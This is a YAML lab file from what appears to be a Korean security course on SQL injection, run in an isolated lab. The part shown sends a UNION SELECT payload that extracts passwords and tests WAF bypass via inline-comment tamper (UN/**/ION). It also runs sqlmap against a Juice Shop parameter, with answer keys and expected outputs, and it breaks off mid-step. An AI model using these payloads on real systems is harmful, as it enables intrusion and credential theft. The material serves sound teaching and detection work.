lab_id: standalone-attack-week04
title: "SQL Injection(sqlmap·WAF 우회) vs SQLi 탐지·차단 분석"
version: standalone-attack
course: attack
week: 4
description: |
  SQL Injection 공방을 공격자(PTES Exploitation) 관점에서 손으로 익힌다. 먼저 가장 직접적인 수동 UNION
  SQLi 를 보내 차단형 WAF(dvwa)가 403 으로 막는 것을 확인하고, 대소문자·주석 tamper 로 WAF 우회를 시도해
  ModSec CRS 정규화가 대소문자는 차단(403)하지만 주석분할(UN/**/ION)은 못 잡아 우회(302)됨을 — '정규화는
  강력하나 만능이 아님'을 실측으로 체감한다. 이어 자동화 도구 sqlmap 으로
  juice 의 검색 파라미터를 4 기법으로 자동 테스트하며 그 "시끄러움"을 보고, 방어 측 modsec_audit.log 에서
  본인 공격이 942(SQLi)+949110(anomaly)으로 잡힌 흔적을 분석한다. 마지막으로 같은 payload 가 차단 모드
  (dvwa 403) vs 탐지 전용 모드(juice 200)로 갈리는 이유와 근본 방어(parameterized query)를 정리한다.
  공격 도구는 el34-attacker, 로그 확인은 el34-web. 명령은 모두 el34 호스트(ssh ccc@{{TARGET_IP}})에서
  실행하며, 컨테이너 작업은 docker exec -it <컨테이너> bash 로 접속해 수행한다. 인가된 실습 환경에서만 수행한다.
difficulty: hard
duration_minutes: 180
prerequisites:
  - "W01–W03 통과"
  - "el34 호스트 SSH + docker exec"
  - "lecture §2(SQLi 유형) §3(sqlmap) §4(WAF 우회) 숙지"
objectives:
  - "수동 UNION SQLi 를 직접 작성해 보내고 차단형 vhost(dvwa)에서 403 차단을 확인한다"
  - "대소문자·주석 tamper 로 WAF 우회를 시도하고, 정규화가 대소문자는 차단(403)·주석분할은 우회(302)됨을 구분해 이해한다"
  - "sqlmap 으로 한 파라미터를 4 기법으로 자동 테스트하고 다량 요청이 방어층에 탐지되는 특성을 안다"
  - "modsec_audit.log 에서 942(SQLi)+949110(anomaly) 탐지 흔적을 찾고 차단 모드 vs 탐지 전용 모드 차이를 설명한다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — sqlmap 가용성 + 대상 도달성
      모든 공격의 0단계는 "도구가 있고 대상에 닿는가" 확인이다. SQLi 자동화 도구 sqlmap 이
      attacker 컨테이너에 설치돼 있는지, 그리고 차단형 vhost(dvwa)에 네트워크로 도달하는지 본다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
      command -v sqlmap
      # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
      curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/
      ```
      - `command -v sqlmap`(설치 경로), `curl ... -H 'Host: dvwa.el34.lab'`(fw 게이트웨이로 보내되 dvwa vhost 지정), `-o /dev/null -w '%{http_code}'`(본문 버리고 코드만).
      ## ✅ 합격 기준
      `sqlmap` 출력 시 통과. **근거:** sqlmap 경로가 출력돼 사용 가능하고 dvwa 에 도달(HTTP 코드 응답)하면
      통과 — 공격 착수 전 도구·대상 준비 상태를 확인하는 기본 절차다.
    hint: 'command -v sqlmap + 도달성'
    category: survey
    points: 10
    answer: |
      # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
      docker exec el34-attacker sh -c 'command -v sqlmap'
      # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
    answer_detail: "SQLi 자동화 도구 sqlmap 이 attacker 에 설치됐는지(command -v 로 경로 확인)와 대상 vhost(dvwa=차단 모드, juice=탐지만)에 도달하는지를 점검한다. 공격 착수 전 도구·대상 준비 상태를 1분 내 확인하는 기본 절차다."
    expected_output: |
      /usr/bin/sqlmap
      도달=302
    verify:
      type: output_contains
      expect: 'sqlmap'
      field: stdout
      semantic:
        intent: "sqlmap + 대상 점검"
        success_criteria: ["sqlmap 가용", "대상 도달"]
        acceptable_methods: ["**[OSS] command -v + curl (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 수동 UNION SQLi — dvwa 차단(403)
      가장 직접적인 UNION-based SQLi 를 손으로 만들어 보낸다. `UNION SELECT` 는 정상 질의 결과 뒤에
      다른 테이블(users 의 계정·비밀번호)을 이어 붙여 응답에 노출시키는 기법이다. 차단형 WAF(dvwa)가
      이 평문 SQLi 를 얼마나 쉽게 막는지 직접 확인한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 1) 수동 UNION SQLi(users 계정/비번 추출 시도) — 차단형 dvwa 응답코드
      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-"
      # 2) 해석 — UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다
      echo "→ UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다"
      ```
      - payload `1' UNION SELECT user,password FROM users-- -`(URL 인코딩: `%27`=`'`, `%20`=공백, 끝 `-- -`=원래 SQL 주석). dvwa vhost=`SecRuleEngine On`(차단 모드)이라 SQLi 룰 매치 시 요청을 끊는다.

      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** UNION SQLi 가 dvwa 에서 403(WAF 차단)으로 응답되면 통과 — 평문 SQLi 는
      CRS 가 가장 쉽게 잡는다(942 매치 → anomaly 누적 → 949110 차단).
    hint: 'UNION SELECT → dvwa 403'
    category: manipulation
    points: 12
    answer: |
      # 1) 수동 UNION SQLi(users 계정/비번 추출 시도) — 차단형 dvwa 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
      # 2) 해석 — UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다
      echo "→ UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다"
    answer_detail: "UNION-based SQLi 는 다른 테이블을 결과에 합쳐 추출하는 가장 직접적인 기법이다. dvwa(SecRuleEngine On)에서는 payload 가 942 룰군(SQLi 변형)에 매치되고 anomaly score 가 누적돼 949110(임계치 도달)이 발동, 403 으로 차단된다. 평문 SQLi 는 CRS 가 가장 쉽게 잡는다는 점을 403 응답으로 판정한다."
    expected_output: |
      dvwa=403
      → UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "수동 UNION SQLi + WAF 차단"
        success_criteria: ["UNION SELECT", "403 차단"]
        acceptable_methods: ["**[OSS] UNION SQLi → 403 (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 WAF 우회(tamper) 시도 — 무엇이 막히고 무엇이 뚫리나
      payload 를 변형해 WAF 시그니처를 피하는 시도가 tamper 다. 두 고전 기법을 직접 넣어 **어느 쪽이
      막히고 어느 쪽이 뚫리는지** 실측한다 — 대소문자 섞기(`UnIoN sElEcT`)와 키워드 사이 주석 삽입
      (`UN/**/ION SE/**/LECT`). 둘 다 DB 는 정상 실행하지만 단순 시그니처는 못 알아본다.

      ## 📖 개념 한 줄
      ModSec CRS 는 검사 전 입력을 표준형으로 되돌리는 정규화(normalization)를 한다. 대소문자 변형은
      정규화로 복원돼 **여전히 차단(403)** 된다. 그러나 이 el34 CRS 3.3.2 의 SQLi 탐지(libinjection)는
      키워드 사이 주석 분할을 못 복원해 **주석삽입은 실제로 우회(302)** 된다 — "정규화가 모든 변형을
      잡는다"는 통념이 깨지는 실측 사례다(우회 성공이 곧 더 강력한 교훈).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
      K=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--")
      echo "case=$K"
      # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
      C=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--")
      echo "comment=$C"
      # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
      # 4) 대조 — 대소문자는 정규화로 복원돼 차단(403)
      echo "→ 대조: 대소문자(case=$K)는 정규화로 복원돼 차단. tamper도 기법마다 결과가 다르다"
      ```
      - `UnIoN sElEcT`(대소문자 섞기 — 정규화로 복원→403), `UN/**/ION SE/**/LECT`(SQL 인라인 주석 `/**/` 삽입 — libinjection 미복원→302 우회).

      ## ✅ 합격 기준
      `우회 성공` 출력 시 통과. **근거:** 실측상 대소문자(case=403)는 차단되지만 주석삽입(comment=302)은
      이 CRS 를 우회한다 — 두 결과의 대조로 "정규화가 모든 변형을 잡지는 못함"을 확인(우회가 안 되면 미통과).
    hint: 'UN/**/ION, UnIoN tamper → 결과'
    category: manipulation
    points: 14
    answer: |
      # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
      K=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\"")
      echo "case=$K"
      # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
      C=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\"")
      echo "comment=$C"
      # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
      # 4) 대조 — 대소문자는 정규화로 복원돼 차단(403)
      echo "→ 대조: 대소문자(case=$K)는 정규화로 복원돼 차단. tamper도 기법마다 결과가 다르다"
    answer_detail: "tamper 의 두 결과를 대조한다. 대소문자(UnIoN)는 ModSec CRS 의 정규화로 UNION 으로 복원돼 여전히 942 룰에 차단(403). 그러나 키워드 사이 주석 분할(UN/**/ION)은 이 el34 CRS 3.3.2 의 libinjection 이 토큰을 복원하지 못해 실제로 우회(302)된다. '정규화가 모든 변형을 잡는다'는 통념과 달리 주석삽입은 유효한 우회 경로다 — 판정은 comment 응답이 차단(403)이 아닌 우회임을 게이트한다(대소문자 차단·주석삽입 우회의 대조가 핵심)."
    expected_output: |
      case=403
      comment=302
      → 주석삽입 우회 성공(comment=302): 정규화가 주석분할은 못 잡음
      → 대조: 대소문자(case=403)는 정규화로 복원돼 차단. tamper도 기법마다 결과가 다르다
    verify:
      type: output_contains
      expect: '우회 성공'
      field: stdout
      semantic:
        intent: "WAF tamper — 차단(대소문자)과 우회(주석삽입) 대조"
        success_criteria: ["대소문자 403 차단", "주석삽입 302 우회"]
        acceptable_methods: ["**[OSS] tamper 변형별 응답 비교 (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 sqlmap 자동화 — 한 파라미터를 4 기법으로
      수동 시도를 자동화 도구로 대체한다. sqlmap 은 대상 URL 의 한 파라미터를 4 기법(Boolean/Time/
      UNION/Error)으로 자동 주입해 취약 여부를 판별한다. 여기서는 juiceshop 의 REST 검색 파라미터
      `/rest/products/search?q=` 를 대상으로 한다(juice 는 W03 에서 본 API 구조). 자동화의 위력과
      동시에 "매우 시끄럽다"(다량 비정상 요청으로 WAF/IDS 에 다수 탐지)는 특성을 체감한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 1) sqlmap으로 juice 검색 파라미터를 4기법(boolean/time/union/error) 자동 테스트(40초 제한)
      timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6
      # 2) 해석 — 자동 테스트는 빠르지만 다량 비정상 요청이라 매우 시끄러움(WAF/IDS 다수 탐지)
      echo "→ sqlmap이 파라미터를 자동 테스트(boolean/time/union/error). 빠르지만 매우 시끄러움"
      ```
      - `-u <URL>`+`-H 'Host: juice.el34.lab'`(대상·vhost), `--batch`(무인), `--level=1`/`--risk=1`(범위·공격성), `--flush-session`(캐시 비움), `timeout 40`(40초 제한).

      ## ✅ 합격 기준
      `testing` 출력 시 통과. **근거:** sqlmap 이 파라미터 자동 테스트를 시작해 testing 라인이 나타나면
      통과(timeout 40 으로 완주 못 해도 시작 자체가 합격) — 자동화는 빠르지만 매우 시끄럽다.
    hint: 'sqlmap --batch 자동 테스트'
    category: recon
    points: 12
    answer: |
      # 1) sqlmap으로 juice 검색 파라미터를 4기법(boolean/time/union/error) 자동 테스트(40초 제한)
